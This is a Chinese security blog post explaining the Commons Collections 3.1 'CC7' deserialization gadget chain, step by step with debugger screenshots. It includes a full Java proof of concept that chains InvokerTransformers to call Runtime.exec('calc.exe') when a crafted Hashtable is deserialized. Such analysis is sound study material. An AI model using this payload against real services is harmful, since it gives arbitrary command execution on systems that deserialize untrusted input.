# CommonsCollections7 （CC7链）

## 说明

### 导入依赖

    
    
    <dependency>  
    <groupId>commons-collections</groupId>  
    <artifactId>commons-collections</artifactId>  
    <version>3.1</version>  
    </dependency>

### 利用链

    
    
    Hashtable.readObject  
    Hashtable.reconstitutionPut  
    Hashtable.reconstitutionPut  
      LazyMap.equals 没实现，找父类  
         AbstractMapDecorator.equals  
            HashMap.equals 没实现，找父类  
               AbstractMap.equals  
                  LazyMap.get  
       ChainedTransformer.transform()  
                        ConstantTransformer.transform()  
                        InvokerTransformer.transform()

### ysoserial简化后的payload

    
    
    package com.ysoserial;  
    ​  
    import org.apache.commons.collections.Transformer;  
    import org.apache.commons.collections.functors.ChainedTransformer;  
    import org.apache.commons.collections.functors.ConstantTransformer;  
    import org.apache.commons.collections.functors.InvokerTransformer;  
    import org.apache.commons.collections.map.LazyMap;  
    import java.io.*;  
    import java.lang.reflect.Field;  
    import java.util.*;  
    ​  
    public class CommonCollections7 {  
    public static void main(String[] args) throws IOException, ClassNotFoundException {  
        Transformer transformerChain = new ChainedTransformer(new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class} ,new Object[]{"getRuntime",new Class[0]}),  
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"calc.exe"})  
        });  
    ​  
        HashMap hashMap1 = new HashMap();  
        HashMap hashMap2 = new HashMap();  
    ​  
        Map map1=LazyMap.decorate(hashMap1,transformerChain);  
        map1.put("1",1);  
        Map map2 = LazyMap.decorate(hashMap2, transformerChain);  
        map2.put("2",2);  
    ​  
        Hashtable hashtable = new Hashtable();  
        hashtable.put(map1,1);  
        hashtable.put(map2,2);  
    ​  
    ​  
        //序列化  
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);  
        objectOutputStream.writeObject(hashtable);  
        byteArrayOutputStream.flush();  
        byte[] bytes = byteArrayOutputStream.toByteArray();  
    ​  
    ​  
        //反序列化  
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);  
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);  
        objectInputStream.readObject();  
    ​  
    }  
    }

## 分析正文

老样子，首先是Hashtable的readObject()方法

![1650594656_62621360aa5868bc5b93d.png!small?1650594655985](https://image.3001.net/images/20220422/1650594656_62621360aa5868bc5b93d.png!small?1650594655985)

![1650594661_626213659d5f0268551f8.png!small?1650594660751](https://image.3001.net/images/20220422/1650594661_626213659d5f0268551f8.png!small?1650594660751)

 **小知识：Entry是一个数据结构，这个类里存放了key和value，是许多map和set的底层数据结构**

这里newTable是一个Entry数组，而且为空

由于我们在Hashtable中存入了两个键值对

    
    
    Hashtable hashtable = new Hashtable();  
    hashtable.put(map1,1);  
    hashtable.put(map2,2);

所以这里的elements值为2，第一次读取key为map1，value为1，然后调用reconstitutionPut

![image-20220420132654592](https://image.3001.net/images/20220421/1650506689_6260bbc1c88cf10857c0c.png!small)

第一次调用reconstitutionPut，由于e为空所以不满足循环条件，然后将key和value存入上面说的newTable

这里的key为map1，value为1

调用完接着回到这个循环

![image-20220420132948847](https://image.3001.net/images/20220421/1650506706_6260bbd272615c8c18d39.png!small)

因为elements在上次值为2，这里elements--，值为1，依旧满足大于0的条件，继续进入循环，然后再次读取key和value，这里读取到的key为map2，value为2

然后继续调用reconstitutionPut

![image-20220420133126191](https://image.3001.net/images/20220421/1650506767_6260bc0f6ba7058010380.png!small)

这里我们动态调式出了index的值为0，因为上一次调用reconstitutionPut方法，往这个tab数组里存了值，所以这里tab[0]其实是存了map1和1的Entry类

![1650594679_62621377f276d746756e9.png!small?1650594679406](https://image.3001.net/images/20220422/1650594679_62621377f276d746756e9.png!small?1650594679406)

满足循环条件，然后在if语句里调用了e.key.equals(key)，我们说过e的key为map1，而equals(key)里的key为map2，这里的map1和map2是LazyMap类型

    
    
    Map map1=LazyMap.decorate(hashMap1,transformerChain);  
    map1.put("1",1);  
    Map map2 = LazyMap.decorate(hashMap2, transformerChain);  
    map2.put("2",2);

所以他其实就是调用LazyMap.equals()方法，然后传了一个map2，

又因为LazyMap里没有这个equals方法，所以他会去找他父类，他的父类为AbstractMapDecorator![1650594743_626213b764651caa05e9a.png!small?1650594742538](https://image.3001.net/images/20220422/1650594743_626213b764651caa05e9a.png!small?1650594742538)

他的父类实现了equals方法

![1650594749_626213bd5f9e00156984b.png!small?1650594748505](https://image.3001.net/images/20220422/1650594749_626213bd5f9e00156984b.png!small?1650594748505)

他去调用map属性的equals方法，这里的map其实是我们创建LazyMap时传入的HashMap

    
    
    HashMap hashMap1 = new HashMap();  
    HashMap hashMap2 = new HashMap();  
    ​  
    Map map1=LazyMap.decorate(hashMap1,transformerChain);  
    Map map2 = LazyMap.decorate(hashMap2, transformerChain);

然后他就去找HashMap的equals方法，HashMap没有equals，他就去找他爹

![1650594755_626213c37051b6d5e337a.png!small?1650594754737](https://image.3001.net/images/20220422/1650594755_626213c37051b6d5e337a.png!small?1650594754737)

这里的迭代器i其实是map1的entrySet()的迭代器，while循环里是拿到map1里的key和value，map1存的key为"1"和1

然后是m，这里的m其实是传递过来的map2，value不为空，所以他会走else，然后先调用m.get(key)，实际就是map2.get("1")

map2我们说过他是LazyMap类型，他就去执行LazyMap的get方法

![image-20220420134939973](https://image.3001.net/images/20220421/1650507313_6260be3160e3db3db1fec.png!small)

我们都知道我们创建map2的时候，存入的key值是为"2"，而不是为"1"，而他这里问我们map2里包含1吗，肯定不包含，所以满足if条件，进入if语句

调用factory的transform方法，这个我们之前说过，不再复述

分析结束

召唤神龙！

![1650506474_6260baea60fb599817ba0.png!small?1650506474927](https://image.3001.net/images/20220421/1650506474_6260baea60fb599817ba0.png!small?1650506474927)

